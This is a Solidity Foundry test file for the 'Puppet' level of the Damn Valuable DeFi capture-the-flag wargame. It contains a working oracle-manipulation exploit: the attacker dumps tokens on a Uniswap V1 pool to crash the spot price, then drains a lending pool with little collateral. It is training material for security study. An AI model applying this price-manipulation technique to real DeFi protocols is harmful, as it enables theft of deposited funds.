// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import {Utilities} from "../../utils/Utilities.sol";
import "forge-std/Test.sol";
import "forge-std/console2.sol";

import {DamnValuableToken} from "../../../src/Contracts/DamnValuableToken.sol";
import {PuppetPool} from "../../../src/Contracts/puppet/PuppetPool.sol";

interface UniswapV1Exchange {
    function addLiquidity(
        uint256 min_liquidity,
        uint256 max_tokens,
        uint256 deadline
    ) external payable returns (uint256);

    function balanceOf(address _owner) external view returns (uint256);

    function tokenToEthSwapInput(
        uint256 tokens_sold,
        uint256 min_eth,
        uint256 deadline
    ) external returns (uint256);

    function getTokenToEthInputPrice(uint256 tokens_sold)
        external
        view
        returns (uint256);
}

interface UniswapV1Factory {
    function initializeFactory(address template) external;

    function createExchange(address token) external returns (address);
}

contract PuppetV1 is Test {
    // Uniswap exchange will start with 10 DVT and 10 ETH in liquidity
    uint256 internal constant UNISWAP_INITIAL_TOKEN_RESERVE = 10e18;
    uint256 internal constant UNISWAP_INITIAL_ETH_RESERVE = 10e18;

    uint256 internal constant ATTACKER_INITIAL_TOKEN_BALANCE = 1_000e18;
    uint256 internal constant ATTACKER_INITIAL_ETH_BALANCE = 25e18;
    uint256 internal constant POOL_INITIAL_TOKEN_BALANCE = 100_000e18;
    uint256 internal constant DEADLINE = 10_000_000;

    UniswapV1Exchange internal uniswapV1ExchangeTemplate;
    UniswapV1Exchange internal uniswapExchange;
    UniswapV1Factory internal uniswapV1Factory;

    DamnValuableToken internal dvt;
    PuppetPool internal puppetPool;
    address payable internal attacker;

    function setUp() public {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        attacker = payable(
            address(uint160(uint256(keccak256(abi.encodePacked("attacker")))))
        );
        vm.label(attacker, "Attacker");
        vm.deal(attacker, ATTACKER_INITIAL_ETH_BALANCE);

        // Deploy token to be traded in Uniswap
        dvt = new DamnValuableToken();
        vm.label(address(dvt), "DVT");

        uniswapV1Factory = UniswapV1Factory(
            deployCode("./src/build-uniswap/v1/UniswapV1Factory.json")
        );

        // Deploy a exchange that will be used as the factory template
        uniswapV1ExchangeTemplate = UniswapV1Exchange(
            deployCode("./src/build-uniswap/v1/UniswapV1Exchange.json")
        );

        // Deploy factory, initializing it with the address of the template exchange
        uniswapV1Factory.initializeFactory(address(uniswapV1ExchangeTemplate));

        uniswapExchange = UniswapV1Exchange(
            uniswapV1Factory.createExchange(address(dvt))
        );

        vm.label(address(uniswapExchange), "Uniswap Exchange");

        // Deploy the lending pool
        puppetPool = new PuppetPool(address(dvt), address(uniswapExchange));
        vm.label(address(puppetPool), "Puppet Pool");

        // Add initial token and ETH liquidity to the pool
        dvt.approve(address(uniswapExchange), UNISWAP_INITIAL_TOKEN_RESERVE);
        uniswapExchange.addLiquidity{value: UNISWAP_INITIAL_ETH_RESERVE}(
            0, // min_liquidity
            UNISWAP_INITIAL_TOKEN_RESERVE, // max_tokens
            DEADLINE // deadline
        );

        // Ensure Uniswap exchange is working as expected
        assertEq(
            uniswapExchange.getTokenToEthInputPrice(1 ether),
            calculateTokenToEthInputPrice(
                1 ether,
                UNISWAP_INITIAL_TOKEN_RESERVE,
                UNISWAP_INITIAL_ETH_RESERVE
            )
        );

        // Setup initial token balances of pool and attacker account
        dvt.transfer(attacker, ATTACKER_INITIAL_TOKEN_BALANCE);
        dvt.transfer(address(puppetPool), POOL_INITIAL_TOKEN_BALANCE);

        // Ensure correct setup of pool.
        assertEq(
            puppetPool.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE),
            POOL_INITIAL_TOKEN_BALANCE * 2
        );

        console.log(unicode"🧨 PREPARED TO BREAK THINGS 🧨");
    }

    function testExploit() public {
        /** EXPLOIT START **/

        vm.startPrank(attacker);

        dvt.approve(address(uniswapExchange), type(uint256).max);
        uint256 amountOfEthICanGet = uniswapExchange.getTokenToEthInputPrice(dvt.balanceOf(attacker));
        console2.log("Starting the level with %s ETH", address(attacker).balance);
        console2.log("Can get %s ETH selling initial dvt tokens", amountOfEthICanGet);
        
        // Dump all the dvt tokens on the exchange
        uniswapExchange.tokenToEthSwapInput(dvt.balanceOf(attacker), amountOfEthICanGet, block.timestamp + 1);
        console2.log("Now have %s ETH after 0 loop", address(attacker).balance);

        // Lever up using the ETH I just got and the new price

        // ------------------- First loop -----------------------

        // We compute the amount we can borrow based on the current price
        uint256 priceInEthPerToken = (address(uniswapExchange).balance * 1e18) / dvt.balanceOf(address(uniswapExchange));
        uint256 ethRequired = address(attacker).balance;
        uint256 borrowAmount = ethRequired / (priceInEthPerToken * 2) * 1e18;
        borrowAmount = (borrowAmount <= dvt.balanceOf(address(puppetPool))) ? borrowAmount : dvt.balanceOf(address(puppetPool));
        ethRequired = borrowAmount * priceInEthPerToken * 2 / 1e18;
        console2.log("Can borrow %s tokens using %s wei", borrowAmount, ethRequired);

        puppetPool.borrow{value: ethRequired}(borrowAmount);
        console2.log("Now have %s ETH after 1 loop, puppetPool has %s tokens, I have %s tokens", address(attacker).balance, dvt.balanceOf(address(puppetPool)), dvt.balanceOf(attacker));



        // ------------------- Second loop -----------------------

        // priceInEthPerToken = (address(uniswapExchange).balance) / dvt.balanceOf(address(uniswapExchange));
        // borrowAmount = address(attacker).balance / (priceInEthPerToken * 2);
        // console2.log("Can borrow %s tokens using %s wei", borrowAmount, address(attacker).balance);

        // puppetPool.borrow{value: address(attacker).balance}(borrowAmount);
        // amountOfEthICanGet = uniswapExchange.getTokenToEthInputPrice(dvt.balanceOf(attacker));
        // uniswapExchange.tokenToEthSwapInput(dvt.balanceOf(attacker), amountOfEthICanGet, block.timestamp + 1);
        // console2.log("Now have %s ETH after 2 loops, puppetPool has %s tokens", address(attacker).balance, dvt.balanceOf(address(puppetPool)));


        console2.log("Finishing the level with %s ETH", address(attacker).balance / 1e18);
        vm.stopPrank();

        /** EXPLOIT END **/
        validation();
    }

    function validation() internal {
        // Attacker has taken all tokens from the pool
        assertGe(dvt.balanceOf(attacker), POOL_INITIAL_TOKEN_BALANCE);
        assertEq(dvt.balanceOf(address(puppetPool)), 0);
    }

    // Calculates how much ETH (in wei) Uniswap will pay for the given amount of tokens
    function calculateTokenToEthInputPrice(
        uint256 input_amount,
        uint256 input_reserve,
        uint256 output_reserve
    ) internal returns (uint256) {
        uint256 input_amount_with_fee = input_amount * 997;
        uint256 numerator = input_amount_with_fee * output_reserve;
        uint256 denominator = (input_reserve * 1000) + input_amount_with_fee;
        return numerator / denominator;
    }
}
